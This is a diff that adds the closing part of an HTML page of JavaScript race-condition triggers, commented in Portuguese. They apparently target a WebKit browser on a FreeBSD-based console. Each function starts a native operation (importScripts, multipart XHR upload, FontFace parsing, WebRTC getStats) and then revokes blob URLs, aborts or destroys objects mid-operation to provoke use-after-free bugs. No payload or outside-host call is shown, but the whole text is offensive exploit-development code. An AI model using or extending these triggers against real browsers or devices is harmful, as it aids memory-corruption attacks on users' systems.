+        // importScripts para a execução da pthread do Worker até que o arquivo seja lido do disco.
+        function runImportScriptsSyncVFSRace() {
+            log("[FreeBSD/VFS] Iniciando importScripts() Sync VFS Race...");
+            
+            // Criamos um payload gigante para atrasar a leitura do VFS
+            let padding = "/*" + "A".repeat(1024 * 1024 * 20) + "*/"; // 20MB de comentários
+            let blob = new Blob([padding + "\npostMessage('loaded');"], {type: "text/javascript"});
+            let url = URL.createObjectURL(blob);
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    // Trava a pthread do Worker no kernel (syscall read)
+                    importScripts(e.data); 
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Manda o worker iniciar o bloqueio
+            w.postMessage(url);
+            
+            // Corrida: A pthread do worker chamou o VFS para ler a URL.
+            // A thread principal manda o VFS destruir o vnode simultaneamente.
+            setTimeout(() => {
+                URL.revokeObjectURL(url);
+                w.terminate();
+                log("[FreeBSD/VFS] importScripts interrompido. vnode revogado durante leitura bloqueante.");
+            }, 5);
+        }
+
+        // --- 98. XHR FormData Multipart Socket Abort ---
+        // Alvo: Serializador Multipart em C++ e buffer de sockets TCP.
+        // Enviar um FormData com Blobs gigantes obriga o C++ a gerar boundaries (limites) em tempo real
+        // e fazer streaming direto para o socket, em vez de carregar tudo na RAM.
+        function runXHRFormDataSocketAbort() {
+            log("[Net/TCP] Iniciando FormData Multipart Socket Abort...");
+            
+            let formData = new FormData();
+            // Injeta múltiplos arquivos virtuais massivos
+            for(let i=0; i<5; i++) {
+                formData.append("file_" + i, new Blob([new Uint8Array(1024 * 1024 * 10)]), "fake.bin");
+            }
+            
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://127.0.0.1:9999/upload", true); // Porta de descarte
+            
+            // Inicia a engine de serialização C++ -> Socket FreeBSD
+            xhr.send(formData);
+            
+            // Quando a engine C++ estiver no meio da montagem dos cabeçalhos multipart
+            // e escrevendo no descritor de arquivo de rede (FD), nós cortamos a conexão.
+            setTimeout(() => {
+                xhr.abort();
+                log("[Net/TCP] Stream Multipart interrompido brutalmente no socket de rede.");
+            }, 2);
+        }
+
+        // --- 99. FontFace OS Parser mmap Teardown ---
+        // Alvo: Renderizador de Fontes do SO (ex: FreeType) interagindo com a VMM.
+        // Quando carregamos uma fonte web, o WebKit passa a memória para a biblioteca gráfica do sistema.
+        function runFontFaceOSParserTeardown() {
+            log("[OS/Graphics] Iniciando FontFace OS Parser Teardown...");
+            
+            // 15MB de lixo. O parser nativo tentará buscar as tabelas (glyf, cmap)
+            let fakeFontBuffer = new Uint8Array(1024 * 1024 * 15).fill(0x00); 
+            let blob = new Blob([fakeFontBuffer], {type: "font/ttf"});
+            let url = URL.createObjectURL(blob);
+            
+            let font = new FontFace("ExploitFont", "url(" + url + ")");
+            
+            // Envia para o motor C++ de fontes
+            font.load().catch(()=>{});
+            
+            // O parser C++ está ativamente tentando ler os ponteiros da fonte na memória.
+            // Revogamos o mapeamento VFS e destruímos a referência JS.
+            setTimeout(() => {
+                URL.revokeObjectURL(url);
+                font = null;
+                log("[OS/Graphics] Parser nativo de fontes orfanado durante validação de tabelas.");
+            }, 3);
+        }
+
+        // --- 100. WebRTC getStats() OS Interface Polling Death ---
+        // Alvo: Polling de estatísticas do FreeBSD (ifaddrs, netstat).
+        // getStats() não lê variáveis de JS; ele dispara uma thread nativa para coletar 
+        // dados reais das interfaces de rede do console.
+        function runWebRTCOsNetworkPollingDeath() {
+            log("[Net/OS] Iniciando getStats OS Polling Death...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel("stats_race");
+                
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    
+                    // Dispara a query assíncrona nas APIs do kernel de rede
+                    pc.getStats().then(() => {
+                        log("[Net/OS] Polling concluído (Anomalia, deveria ter sido destruído).");
+                    }).catch(()=>{});
+                    
+                    // Destrói a PeerConnection enquanto a thread de background 
+                    // está varrendo as interfaces físicas e virtuais do sistema.
+                    pc.close();
+                    pc = null;
+                    
+                    log("[Net/OS] PC destruída enquanto o C++ consultava tabelas de roteamento do OS.");
+                });
+            } catch(e) {
+                log("[Net/OS] Erro: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
